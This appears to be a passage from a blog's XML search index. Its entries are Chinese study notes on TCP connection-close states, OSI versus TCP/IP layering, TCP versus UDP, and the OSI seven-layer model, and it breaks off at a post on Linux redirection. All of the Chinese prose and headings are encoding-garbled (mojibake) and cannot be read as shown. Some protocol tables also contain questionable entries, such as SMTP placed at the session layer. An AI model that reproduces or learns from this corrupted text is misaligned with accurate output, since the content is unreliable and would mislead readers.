çš„ä¸€ä¸ªè¿‡æ¸¡é˜¶æ®µï¼Œè¯¥é˜¶æ®µéœ€è¦è€ƒè™‘æ˜¯å¦è¿˜æœ‰æ•°æ®å‘é€ç»™å¯¹æ–¹ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±å¯ä»¥å…³é—­è¿æ¥ï¼Œå‘é€ FIN æŠ¥æ–‡ï¼Œç„¶åè¿›å…¥ LAST_ACK çŠ¶æ€ã€‚<br><strong>LAST_ACK</strong>ï¼šè¢«åŠ¨å…³é—­ä¸€æ–¹å‘é€ FIN æŠ¥æ–‡ä¹‹åï¼Œæœ€åç­‰å¾…å¯¹æ–¹çš„ ACK æŠ¥æ–‡æ‰€å¤„çš„çŠ¶æ€ã€‚<br><strong>CLOSED</strong>ï¼šå½“æ”¶åˆ° ACK ä¿æ¸©åï¼Œå°±å¯ä»¥è¿›å…¥ CLOSED çŠ¶æ€äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSIä¸ƒå±‚å’ŒTCP/IPå››å±‚çš„å…³ç³»</title>
      <link href="/post/1fac9017.html"/>
      <url>/post/1fac9017.html</url>
      
        <content type="html"><![CDATA[<h1 id="OSI-ä¸ƒå±‚å’Œ-TCP-IP-å››å±‚çš„å…³ç³»"><a href="#OSI-ä¸ƒå±‚å’Œ-TCP-IP-å››å±‚çš„å…³ç³»" class="headerlink" title="OSI ä¸ƒå±‚å’Œ TCP/IP å››å±‚çš„å…³ç³»"></a>OSI ä¸ƒå±‚å’Œ TCP/IP å››å±‚çš„å…³ç³»</h1><h2 id="ä¸€ã€åŸºæœ¬å…³ç³»"><a href="#ä¸€ã€åŸºæœ¬å…³ç³»" class="headerlink" title="ä¸€ã€åŸºæœ¬å…³ç³»"></a>ä¸€ã€åŸºæœ¬å…³ç³»</h2><ol><li>OSI å¼•å…¥äº†æœåŠ¡ã€æ¥å£ã€åè®®ã€åˆ†å±‚çš„æ¦‚å¿µï¼ŒTCP/IP å€Ÿé‰´äº† OSI çš„è¿™äº›æ¦‚å¿µå»ºç«‹ TCP/IP æ¨¡å‹ã€‚</li><li>OSI å…ˆæœ‰æ¨¡å‹ï¼Œåæœ‰åè®®ï¼Œå…ˆæœ‰æ ‡å‡†ï¼Œåè¿›è¡Œå®è·µï¼›è€Œ TCP/IP åˆ™ç›¸åï¼Œå…ˆæœ‰åè®®å’Œåº”ç”¨å†æå‡ºäº†æ¨¡å‹ï¼Œä¸”æ˜¯å‚ç…§çš„ OSI æ¨¡å‹ã€‚</li><li>OSI æ˜¯ä¸€ç§ç†è®ºä¸‹çš„æ¨¡å‹ï¼Œè€Œ TCP/IP å·²è¢«å¹¿æ³›ä½¿ç”¨ï¼Œæˆä¸ºç½‘ç»œäº’è”äº‹å®ä¸Šçš„æ ‡å‡†ã€‚</li></ol><p>â€‹</p><h2 id="äºŒã€å¯¹åº”å…³ç³»"><a href="#äºŒã€å¯¹åº”å…³ç³»" class="headerlink" title="äºŒã€å¯¹åº”å…³ç³»"></a>äºŒã€å¯¹åº”å…³ç³»</h2><p>TCP/IP å’Œ OSI æ¨¡å‹ç»„å¹¶ä¸èƒ½ç²¾ç¡®çš„åŒ¹é…ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å°½å¯èƒ½çš„å‚è€ƒ OSI æ¨¡å‹å¹¶åœ¨å…¶ä¸­æ‰¾åˆ° TCP/IP çš„å¯¹åº”ä½ç½®ã€‚</p><table><thead><tr><th><strong>OSI ä¸ƒå±‚</strong></th><th><strong>TCP/IP å››å±‚</strong></th><th><strong>å¸¸ç”¨ç½‘ç»œåè®®</strong></th></tr></thead><tbody><tr><td>åº”ç”¨å±‚ï¼ˆApplicationï¼‰</td><td>åº”ç”¨å±‚</td><td>HTTPã€TFTPã€FTPã€NFSã€WAISã€SMTP</td></tr><tr><td>è¡¨ç¤ºå±‚ï¼ˆPresentationï¼‰</td><td></td><td>Telnetã€Rloginã€SNMPã€Gopher</td></tr><tr><td>ä¼šè¯å±‚ï¼ˆSessionï¼‰</td><td></td><td>SMTPã€DNS</td></tr><tr><td>ä¼ è¾“å±‚ï¼ˆTransportï¼‰</td><td>ä¼ è¾“å±‚</td><td>TCPã€UDP</td></tr><tr><td>ç½‘ç»œå±‚ï¼ˆNetworkï¼‰</td><td>ç½‘ç»œå±‚</td><td>IPã€ICMPã€ARPã€RARPã€AKPã€UUCP</td></tr><tr><td>æ•°æ®é“¾è·¯å±‚ï¼ˆData Linkï¼‰</td><td>æ•°æ®é“¾è·¯å±‚</td><td>FDDIã€Ethernetã€Arpanetã€PDNã€SLIPã€PPP</td></tr><tr><td>ç‰©ç†å±‚ï¼ˆPhysicalï¼‰</td><td></td><td>IEEE 802.1Aã€IEEE 802.2 åˆ° IEEE 802.11</td></tr></tbody></table><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627296657899-ff4ec8a6-f567-421b-981c-017719cdeccf.png#clientId=ue44d79d7-cdf3-4&amp;from=paste&amp;height=720&amp;id=u2ddeb6c9&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=720&amp;originWidth=960&amp;originalType=binary%E2%88%B6=1&amp;size=158223&amp;status=done&amp;style=none&amp;taskId=u9c8b0618-079a-44ad-bdcc-9d321cec8b3&amp;width=960" alt="image.png"></p><h2 id="ä¸‰ã€åŒºåˆ«"><a href="#ä¸‰ã€åŒºåˆ«" class="headerlink" title="ä¸‰ã€åŒºåˆ«"></a>ä¸‰ã€åŒºåˆ«</h2><ol><li>TCP/IP ä»–æ˜¯ä¸€ä¸ªåè®®ç°‡ï¼Œè€Œ OSIï¼ˆå¼€æ”¾ç³»ç»Ÿäº’è”ï¼‰åˆ™æ˜¯ä¸€ä¸ªæ¨¡å‹ï¼Œä¸” TCP/IP çš„å¼€å‘æ—¶é—´åœ¨ OSI ä¹‹å‰ã€‚</li><li>TCP/IP æ˜¯ç”±ä¸€äº›äº¤äº’æ€§çš„æ¨¡å—åšæˆçš„åˆ†å±‚æ¬¡çš„åè®®ï¼Œå…¶ä¸­æ¯ä¸ªæ¨¡å—æä¾›ç‰¹å®šçš„åŠŸèƒ½ï¼ŒOSI åˆ™æŒ‡å®šäº†å“ªä¸ªåŠŸèƒ½æ˜¯å±äºå“ªä¸€å±‚çš„ã€‚</li><li>TCP/IP æ˜¯å››å±‚ç»“æ„ï¼Œè€Œ OSI æ˜¯ä¸ƒå±‚ç»“æ„ï¼ŒOSI çš„æœ€é«˜ä¸‰å±‚åœ¨ TCP ä¸­ç”¨åº”ç”¨å±‚è¡¨ç¤ºã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCPå’ŒUDPçš„åŒºåˆ«å’Œä¼˜ç¼ºç‚¹</title>
      <link href="/post/e8c36819.html"/>
      <url>/post/e8c36819.html</url>
      
        <content type="html"><![CDATA[<h1 id="TCP-å’Œ-UDP-çš„åŒºåˆ«å’Œä¼˜ç¼ºç‚¹"><a href="#TCP-å’Œ-UDP-çš„åŒºåˆ«å’Œä¼˜ç¼ºç‚¹" class="headerlink" title="TCP å’Œ UDP çš„åŒºåˆ«å’Œä¼˜ç¼ºç‚¹"></a>TCP å’Œ UDP çš„åŒºåˆ«å’Œä¼˜ç¼ºç‚¹</h1><h2 id="ä¸€ã€UDP"><a href="#ä¸€ã€UDP" class="headerlink" title="ä¸€ã€UDP"></a>ä¸€ã€UDP</h2><p>UDPï¼ˆUser Datagram Protocolï¼‰ï¼Œç”¨æˆ·æ•°æ®åŒ…åè®®ï¼Œæ˜¯ä¸€ä¸ªç®€å•çš„é¢å‘æ•°æ®æŠ¥çš„é€šä¿¡åè®®ï¼Œå³å¯¹åº”ç”¨å±‚äº¤ä¸‹æ¥çš„æŠ¥æ–‡ï¼Œä¸åˆå¹¶ï¼Œä¸æ‹†åˆ†ï¼Œåªæ˜¯åœ¨å…¶ä¸Šé¢åŠ ä¸Šé¦–éƒ¨åå°±äº¤ç»™äº†ä¸‹é¢çš„ç½‘ç»œå±‚ã€‚ä¹Ÿå°±æ˜¯è¯´æ— è®ºåº”ç”¨å±‚äº¤ç»™ UDP å¤šé•¿çš„æŠ¥æ–‡ï¼Œå®ƒç»Ÿç»Ÿå‘é€ï¼Œä¸€æ¬¡å‘é€ä¸€ä¸ªæŠ¥æ–‡ã€‚è€Œå¯¹æ¥æ”¶æ–¹ï¼Œæ¥åˆ°åç›´æ¥å»é™¤é¦–éƒ¨ï¼Œäº¤ç»™ä¸Šé¢çš„åº”ç”¨å±‚å°±å®Œæˆä»»åŠ¡ã€‚UDP æŠ¥å¤´åŒ…æ‹¬ 4 ä¸ªå­—æ®µï¼Œæ¯ä¸ªå­—æ®µå ç”¨ 2 ä¸ªå­—èŠ‚ï¼ˆå³ 16 ä¸ªäºŒè¿›åˆ¶ä½ï¼‰ï¼Œæ ‡é¢˜çŸ­ï¼Œå¼€é”€å°ã€‚</p><p>ç‰¹ç‚¹å¦‚ä¸‹ï¼š</p><ul><li>UDP ä¸æä¾›å¤æ‚çš„æ§åˆ¶æœºåˆ¶ï¼Œåˆ©ç”¨ IP æä¾›é¢å‘æ— è¿æ¥çš„é€šä¿¡æœåŠ¡ã€‚</li><li>ä¼ è¾“é€”ä¸­å‡ºç°ä¸¢åŒ…ï¼ŒUDP ä¹Ÿä¸è´Ÿè´£é‡å‘ã€‚</li><li>å½“åŒ…çš„åˆ°è¾¾é¡ºåºå‡ºç°ä¹±åºæ—¶ï¼ŒUDP æ²¡æœ‰çº æ­£çš„åŠŸèƒ½ã€‚</li><li>å¹¶ä¸”å®ƒæ˜¯å°†åº”ç”¨ç¨‹åºå‘æ¥çš„æ•°æ®åœ¨æ”¶åˆ°çš„é‚£ä¸€åˆ»ï¼Œç«‹å³æŒ‰ç…§åŸæ ·å‘é€åˆ°ç½‘ç»œä¸Šçš„ä¸€ç§æœºåˆ¶ã€‚å³ä½¿æ˜¯å‡ºç°ç½‘ç»œæ‹¥å µçš„æƒ…å†µï¼ŒUDP ä¹Ÿæ— æ³•è¿›è¡Œæµé‡æ§åˆ¶ç­‰é¿å…ç½‘ç»œæ‹¥å¡è¡Œä¸ºã€‚</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627299232205-8172a73b-491b-44bb-ac8f-8d4d40f2efb6.png#clientId=u5941d336-2719-4&amp;from=paste&amp;height=195&amp;id=u3622eb47&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=162&amp;originWidth=607&amp;originalType=binary%E2%88%B6=1&amp;size=59413&amp;status=done&amp;style=none&amp;taskId=u61f8df63-6c47-447e-b22f-f131a3155cd&amp;width=729" alt="image.png"></p><h2 id="äºŒã€TCP"><a href="#äºŒã€TCP" class="headerlink" title="äºŒã€TCP"></a>äºŒã€TCP</h2><p>TCPï¼ˆTransmission Control Protocolï¼‰ï¼Œä¼ è¾“æ§åˆ¶åè®®ï¼Œæ˜¯ä¸€ç§å¯é ã€<strong>é¢å‘å­—èŠ‚æµçš„é€šä¿¡åè®®</strong>ï¼ŒæŠŠä¸Šé¢åº”ç”¨å±‚äº¤ä¸‹æ¥çš„æ•°æ®çœ‹æˆæ— ç»“æ„çš„å­—èŠ‚æµæ¥å‘é€ã€‚<br>å¯ä»¥æƒ³è±¡æˆæµæ°´å½¢å¼çš„ï¼Œå‘é€æ–¹ TCP ä¼šå°†æ•°æ®æ”¾å…¥â€œè“„æ°´æ± â€ï¼ˆç¼“å­˜åŒºï¼‰ï¼Œç­‰åˆ°å¯ä»¥å‘é€çš„æ—¶å€™å°±å‘é€ï¼Œä¸èƒ½å‘é€å°±ç­‰ç€ï¼ŒTCP ä¼šæ ¹æ®å½“å‰ç½‘ç»œçš„æ‹¥å¡çŠ¶æ€æ¥ç¡®å®šæ¯ä¸ªæŠ¥æ–‡æ®µçš„å¤§å°ã€‚<br>TCP æŠ¥æ–‡é¦–éƒ¨æœ‰ 20 ä¸ªå­—èŠ‚ï¼Œé¢å¤–å¼€é”€å¤§ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627299314725-be18d32c-db69-4d60-ba5f-536cd7464920.png#clientId=u5941d336-2719-4&amp;from=paste&amp;height=416&amp;id=uf0dd3d58&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=355&amp;originWidth=594&amp;originalType=binary%E2%88%B6=1&amp;size=90777&amp;status=done&amp;style=none&amp;taskId=u75b264c1-147a-4353-8a68-7d362f40b8d&amp;width=696" alt="image.png"></p><h2 id="ä¸‰ã€åŒºåˆ«å’Œä¼˜ç¼ºç‚¹"><a href="#ä¸‰ã€åŒºåˆ«å’Œä¼˜ç¼ºç‚¹" class="headerlink" title="ä¸‰ã€åŒºåˆ«å’Œä¼˜ç¼ºç‚¹"></a>ä¸‰ã€åŒºåˆ«å’Œä¼˜ç¼ºç‚¹</h2><table><thead><tr><th>****</th><th><strong>TCP</strong></th><th><strong>UDP</strong></th></tr></thead><tbody><tr><td>å¯é æ€§</td><td>å¯é </td><td>ä¸å¯é </td></tr><tr><td>è¿æ¥æ€§</td><td>é¢å‘è¿æ¥</td><td>æ— è¿æ¥</td></tr><tr><td>æŠ¥æ–‡</td><td>é¢å‘å­—èŠ‚æµ</td><td>é¢å‘æŠ¥æ–‡</td></tr><tr><td>æ•ˆç‡</td><td>ä¼ è¾“æ•ˆç‡ä½</td><td>ä¼ è¾“æ•ˆç‡é«˜</td></tr><tr><td>åŒå…±æ€§</td><td>å…¨åŒå·¥</td><td>ä¸€å¯¹ä¸€ã€ä¸€å¯¹å¤šã€å¤šå¯¹ä¸€ã€å¤šå¯¹å¤š</td></tr><tr><td>æµé‡æ§åˆ¶</td><td>æ»‘åŠ¨çª—å£</td><td>æ— </td></tr><tr><td>æ‹¥å¡æ§åˆ¶</td><td>æ…¢å¼€å§‹ã€æ‹¥å¡é¿å…ã€å¿«é‡ä¼ ã€å¿«æ¢å¤</td><td>æ— </td></tr><tr><td>ä¼ è¾“æ•ˆç‡</td><td>æ…¢</td><td>å¿«</td></tr></tbody></table><ul><li>TCP æ˜¯é¢å‘è¿æ¥çš„åè®®ï¼Œå»ºç«‹è¿æ¥ 3 æ¬¡æ¡æ‰‹ã€æ–­å¼€è¿æ¥å››æ¬¡æŒ¥æ‰‹ï¼ŒUDP æ˜¯é¢å‘æ— è¿æ¥ï¼Œæ•°æ®ä¼ è¾“å‰åä¸è¿›è¡Œè¿æ¥ï¼Œå‘é€ç«¯åªè´Ÿè´£å°†æ•°æ®å‘é€åˆ°ç½‘ç»œï¼Œæ¥æ”¶ç«¯ä»æ¶ˆæ¯é˜Ÿåˆ—è¯»å–ã€‚</li><li>TCP æä¾›å¯é çš„æœåŠ¡ï¼Œä¼ è¾“è¿‡ç¨‹é‡‡ç”¨æµé‡æ§åˆ¶ã€ç¼–å·ä¸ç¡®è®¤ã€è®¡æ—¶å™¨ç­‰æ‰‹æ®µç¡®ä¿æ•°æ®æ— å·®é”™ï¼Œä¸ä¸¢å¤±ã€‚UDP åˆ™å°½å¯èƒ½ä¼ é€’æ•°æ®ï¼Œä½†ä¸ä¿è¯ä¼ é€’äº¤ä»˜ç»™å¯¹æ–¹ã€‚</li><li>TCP é¢å‘å­—èŠ‚æµï¼Œå°†åº”ç”¨å±‚æŠ¥æ–‡çœ‹æˆä¸€ä¸²æ— ç»“æ„çš„å­—èŠ‚æµï¼Œåˆ†è§£ä¸ºå¤šä¸ª TCP æŠ¥æ–‡æ®µä¼ è¾“åï¼Œåœ¨ç›®çš„ç«™é‡æ–°è£…é…ã€‚UDP åè®®é¢å‘æŠ¥æ–‡ï¼Œä¸æ‹†åˆ†åº”ç”¨å±‚æŠ¥æ–‡ï¼Œåªä¿ç•™æŠ¥æ–‡è¾¹ç•Œï¼Œä¸€æ¬¡å‘é€ä¸€ä¸ªæŠ¥æ–‡ï¼Œæ¥æ”¶æ–¹å»é™¤æŠ¥æ–‡é¦–éƒ¨åï¼ŒåŸå°ä¸åŠ¨å°†æŠ¥æ–‡äº¤ç»™ä¸Šå±‚åº”ç”¨ã€‚</li><li>TCP åªèƒ½ç‚¹å¯¹ç‚¹å…¨åŒå·¥é€šä¿¡ã€‚UDP æ”¯æŒä¸€å¯¹ä¸€ã€ä¸€å¯¹å¤šã€å¤šå¯¹ä¸€å’Œå¤šå¯¹å¤šçš„äº¤äº’é€šä¿¡ã€‚</li></ul><p>â€‹</p><h2 id="å››ã€åº”ç”¨åœºæ™¯"><a href="#å››ã€åº”ç”¨åœºæ™¯" class="headerlink" title="å››ã€åº”ç”¨åœºæ™¯"></a>å››ã€åº”ç”¨åœºæ™¯</h2><table><thead><tr><th><strong>åº”ç”¨åè®®</strong></th><th><strong>åº”ç”¨</strong></th><th><strong>ä¼ è¾“å±‚åè®®</strong></th></tr></thead><tbody><tr><td>SMTP</td><td>ç”µå­é‚®ä»¶</td><td>TCP</td></tr><tr><td>TELNET</td><td>è¿œç¨‹ç»ˆç«¯æ¥å…¥</td><td></td></tr><tr><td>HTTP</td><td>ä¸‡ç»´ç½‘</td><td></td></tr><tr><td>FTP</td><td>æ–‡ä»¶ä¼ è¾“</td><td></td></tr><tr><td>DNS</td><td>åŸŸåè§£æ</td><td>UDP</td></tr><tr><td>TFTP</td><td>æ–‡ä»¶ä¼ è¾“</td><td></td></tr><tr><td>SNMP</td><td>ç½‘ç»œç®¡ç†</td><td></td></tr><tr><td>NFS</td><td>è¿œç¨‹æœªæ¥æœåŠ¡å™¨</td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSIä¸ƒå±‚æ¨¡å‹</title>
      <link href="/post/b1538fc8.html"/>
      <url>/post/b1538fc8.html</url>
      
        <content type="html"><![CDATA[<h1 id="OSI-ä¸ƒå±‚æ¨¡å‹"><a href="#OSI-ä¸ƒå±‚æ¨¡å‹" class="headerlink" title="OSI ä¸ƒå±‚æ¨¡å‹"></a>OSI ä¸ƒå±‚æ¨¡å‹</h1><h2 id="ä¸€ã€æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä¸€ã€æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸€ã€æ˜¯ä»€ä¹ˆï¼Ÿ"></a>ä¸€ã€æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>OSI æ¨¡å‹ï¼ˆOpen System Interconnection Reference Modelï¼Œç¼©å†™ä¸º OSIï¼‰, å…¨å â€œå¼€æ”¾å¼ç³»ç»Ÿäº’è”é€šä¿¡å‚è€ƒæ¨¡å‹â€ï¼Œæ˜¯ä¸€ä¸ªè¯•å›¾ä½¿å„ç§è®¡ç®—æœºåœ¨å…¨ä¸–ç•ŒèŒƒå›´å†…äº’è”ä¸ºç½‘ç»œçš„æ ‡å‡†æ¡†æ¶ã€‚1983 å¹´ï¼Œå›½é™…æ ‡å‡†ç»„ç»‡ï¼ˆISOï¼‰å‘å¸ƒäº†è‘—åçš„ ISO/IEC 7498 æ ‡å‡†ï¼Œå®ƒå®šä¹‰äº†ç½‘ç»œäº’è”çš„ 7 å±‚æ¡†æ¶ï¼Œä¹Ÿå°±æ˜¯å¼€æ”¾å¼ç³»ç»Ÿäº’è”å‚è€ƒæ¨¡å‹ã€‚<br>â€‹</p><h2 id="äºŒã€åˆ’åˆ†"><a href="#äºŒã€åˆ’åˆ†" class="headerlink" title="äºŒã€åˆ’åˆ†"></a>äºŒã€åˆ’åˆ†</h2><p>7 å±‚æ˜¯æŒ‡ OSI ä¸ƒå±‚åè®®æ¨¡å‹ï¼Œä¸»è¦æ˜¯ï¼š</p><ul><li>åº”ç”¨å±‚ï¼ˆApplicationï¼‰</li><li>è¡¨ç¤ºå±‚ï¼ˆPresentationï¼‰</li><li>ä¼šè¯å±‚ï¼ˆSessionï¼‰</li><li>ä¼ è¾“å±‚ï¼ˆTransportï¼‰</li><li>ç½‘ç»œå±‚ï¼ˆNetworkï¼‰</li><li>æ•°æ®é“¾è·¯å±‚ï¼ˆData Linkï¼‰</li><li>ç‰©ç†å±‚ï¼ˆPhysicalï¼‰</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627294808446-ade8058e-90fb-4b0c-ba09-f1b996da3a38.png#clientId=uf9cf67d8-9388-4&amp;from=paste&amp;height=451&amp;id=u38a6f007&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=451&amp;originWidth=180&amp;originalType=binary%E2%88%B6=1&amp;size=49654&amp;status=done&amp;style=none&amp;taskId=uad216a83-e9d1-44eb-9bad-21c6ad52503&amp;width=180" alt="image.png"></p><h2 id="ä¸‰ã€è¯¦ç»†ä»‹ç»"><a href="#ä¸‰ã€è¯¦ç»†ä»‹ç»" class="headerlink" title="ä¸‰ã€è¯¦ç»†ä»‹ç»"></a>ä¸‰ã€è¯¦ç»†ä»‹ç»</h2><table><thead><tr><th><strong>åç§°</strong></th><th><strong>ä¸»è¦åŠŸèƒ½</strong></th><th><strong>å…¸å‹è®¾å¤‡</strong></th><th><strong>å…¸å‹åè®®ã€æ ‡å‡†å’Œåº”ç”¨</strong></th></tr></thead><tbody><tr><td>åº”ç”¨å±‚</td><td>ä¸ºåº”ç”¨è½¯ä»¶æä¾›æ¥å£ï¼Œä½¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿä½¿ç”¨ç½‘ç»œæœåŠ¡</td><td>ç½‘å…³</td><td>http(80)ã€ftp(20/21)ã€smtp(25)ã€pop3(110)ã€telnet(23)ã€dns(53)</td></tr><tr><td>è¡¨ç¤ºå±‚</td><td>æ•°æ®çš„è§£ç å’Œç¼–ç ï¼Œæ•°æ®çš„åŠ å¯†å’Œè§£å¯†ï¼Œæ•°æ®çš„å‹ç¼©å’Œè§£å‹ç¼©</td><td>ç½‘å…³</td><td>ASCLLã€PICTã€TIFFã€JPEGã€ MIDIã€MPEG</td></tr><tr><td>ä¼šè¯å±‚</td><td>å»ºç«‹ã€ç»´æŠ¤ã€ç®¡ç†åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¼šè¯</td><td>ç½‘å…³</td><td>RPCã€SQLã€NFS ã€X WINDOWSã€ASP</td></tr><tr><td>ä¼ è¾“å±‚</td><td>è´Ÿè´£å»ºç«‹ç«¯åˆ°ç«¯çš„é“¾æ¥ï¼Œä¿è¯ä¿æ¸©åœ¨ç«¯åˆ°ç«¯ä¹‹é—´çš„ä¼ è¾“</td><td>ç½‘å…³</td><td>TCPã€UDPã€SPX</td></tr><tr><td>ç½‘ç»œå±‚</td><td>è´Ÿè´£å°†åˆ†ç»„æ•°æ®ä»æºç«¯ä¼ è¾“åˆ°ç›®çš„ç«¯ï¼Œç½‘ç»œå±‚çš„ä¸»è¦ä½œç”¨å°±æ˜¯è·¯ç”±å’Œå¯»å€</td><td>è·¯ç”±å™¨</td><td>IPã€IPXã€APPLETALKã€ICMP</td></tr><tr><td>æ•°æ®é“¾è·¯å±‚</td><td>åœ¨ä¸å¯é çš„ç‰©ç†é“¾è·¯ä¸Šï¼Œæä¾›å¯é çš„æ•°æ®ä¼ è¾“æœåŠ¡</td><td>äº¤æ¢æœºã€ç½‘æ¡¥ã€ç½‘å¡</td><td>802.2ã€802.3ATMã€HDLCã€FRAME RELAY</td></tr><tr><td>ç‰©ç†å±‚</td><td>åˆ©ç”¨ä¼ è¾“ä»‹è´¨ä¸ºæ•°æ®é“¾è·¯å±‚æä¾›ç‰©ç†è¿æ¥ï¼Œå®ç°æ¯”ç‰¹æµçš„é€æ˜ä¼ è¾“</td><td>é›†çº¿å™¨ã€ä¸­ç»§å™¨</td><td>V.35ã€EIA/TIA-232</td></tr></tbody></table><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627386380608-97191207-3c72-448d-9352-6d1082e23210.png#clientId=u2460289d-5e75-4&amp;from=paste&amp;height=722&amp;id=uc903b4eb&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=722&amp;originWidth=710&amp;originalType=binary%E2%88%B6=1&amp;size=94686&amp;status=done&amp;style=none&amp;taskId=u97078a52-2357-4ccd-ae94-cf7506bd41f&amp;width=710" alt="image.png"></p><h2 id="å››ã€æ•°æ®å°è£…å’Œè§£å°è£…"><a href="#å››ã€æ•°æ®å°è£…å’Œè§£å°è£…" class="headerlink" title="å››ã€æ•°æ®å°è£…å’Œè§£å°è£…"></a>å››ã€æ•°æ®å°è£…å’Œè§£å°è£…</h2><h3 id="1-å°è£…è¿‡ç¨‹"><a href="#1-å°è£…è¿‡ç¨‹" class="headerlink" title="1. å°è£…è¿‡ç¨‹"></a>1. å°è£…è¿‡ç¨‹</h3><ol><li> ç”¨æˆ·ä¿¡æ¯è½¬æ¢ä¸ºæ•°æ®ï¼Œä»¥ä¾¿åœ¨ç½‘ç»œä¸Šä¼ è¾“ã€‚</li><li> æ•°æ®è½¬æ¢ä¸ºæ•°æ®æ®µï¼Œå¹¶åœ¨å‘é€æ–¹å’Œæ¥æ”¶æ–¹ä¸»æœºä¹‹é—´å»ºç«‹ä»¥æ¡å¯é çš„è¿æ¥ã€‚</li><li> æ•°æ®æ®µè½¬æ¢ä¸ºæ•°æ®åŒ…æˆ–æ•°æ®æŠ¥ï¼Œå¹¶ä¸”åœ¨æŠ¥å¤´ä¸­æ”¾ä¸Šé€»è¾‘åœ°å€ï¼Œè¿™æ ·ï¼Œæ¯ä»¥ä¸ªæ•°æ®åŒ…éƒ½å¯ä»¥é€šè¿‡äº’è”ç½‘è¿›è¡Œä¼ è¾“ã€‚</li><li> æ•°æ®åŒ…æˆ–æ•°æ®æŠ¥è½¬æ¢ä¸ºå¸§ï¼Œä»¥ä¾¿åœ¨æœ¬åœ°ç½‘ç»œä¸­ä¼ è¾“ã€‚åœ¨æœ¬åœ°ç½‘æ®µä¸Šï¼Œä½¿ç”¨ç¡¬ä»¶ï¼ˆä»¥å¤ªç½‘ï¼‰åœ°å€å”¯ä¸€è¡¨ç¤ºæ¯ä¸€å°ä¸»æœºã€‚</li><li>å¸§è½¬æ¢ä¸ºæ¯”ç‰¹æµï¼Œå¹¶é‡‡ç”¨æ•°å­—ç¼–ç å’Œæ—¶é’Ÿæ–¹æ¡ˆã€‚<blockquote><p>æ³¨ï¼šæ•°æ®æµæ˜¯ä»é«˜å±‚å¾€ä¸‹å°è£…çš„ï¼Œè§£å°è£…å’Œå®ƒçš„è¿‡ç¨‹ç›¸åã€‚</p></blockquote></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627296316686-4bf49c7d-732d-4f6a-abcd-005bc14b76c0.png#clientId=uf9cf67d8-9388-4&amp;from=paste&amp;height=699&amp;id=u7eaa200c&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=699&amp;originWidth=932&amp;originalType=binary%E2%88%B6=1&amp;size=212722&amp;status=done&amp;style=none&amp;taskId=u340f6cae-6f51-4142-9da4-028d6d5f600&amp;width=932" alt="image.png"></p><h3 id="2-è§£å°è£…è¿‡ç¨‹"><a href="#2-è§£å°è£…è¿‡ç¨‹" class="headerlink" title="2. è§£å°è£…è¿‡ç¨‹"></a>2. è§£å°è£…è¿‡ç¨‹</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627296366611-19cc4652-d6e3-4099-b4c0-31c336eaff75.png#clientId=uf9cf67d8-9388-4&amp;from=paste&amp;height=697&amp;id=ua9920a74&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=697&amp;originWidth=972&amp;originalType=binary%E2%88%B6=1&amp;size=208391&amp;status=done&amp;style=none&amp;taskId=u7d0a8ac1-05ee-4600-ad3e-84192d1fe9f&amp;width=972" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux é‡å®šå‘ã€ç®¡é“ç¬¦ä¸ç¯å¢ƒå˜é‡</title>
      <link href="/post/eedeed89.html"/>
      <url>/post/eedeed89.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-é‡å®šå‘ã€ç®¡é“ç¬¦ä¸ç¯å¢ƒå˜é‡"><a href="#Linux-é‡å®šå‘ã€ç®¡é“ç¬¦ä¸ç¯å¢ƒå˜é‡" class="headerlink" title="Linux é‡å®šå‘ã€ç®¡é“ç¬¦ä¸ç¯å¢ƒå˜é‡"></a>Linux é‡å®šå‘ã€ç®¡é“ç¬¦ä¸ç¯å¢ƒå˜é‡</h1><h2 id="ä¸€ã€é‡å®šå‘"><a href="#ä¸€ã€é‡å®šå‘" class="headerlink" title="ä¸€ã€é‡å®šå‘"></a>ä¸€ã€é‡å®šå‘</h2><h3 id="1-è¾“å…¥è¾“å‡ºé‡å®šå‘"><a href="#1-è¾“å…¥è¾“å‡ºé‡å®šå‘" class="headerlink" title="1. è¾“å…¥è¾“å‡ºé‡å®šå‘"></a>1. è¾“å…¥è¾“å‡ºé‡å®šå‘</h3><table><thead><tr><th><strong>åç§°</strong></th><th><strong>è‹±æ–‡</strong></th><th><strong>æ–‡ä»¶æè¿°ç¬¦</strong></th><th><strong>è§£é‡Š</strong></th></tr></thead><tbody><tr><td>æ 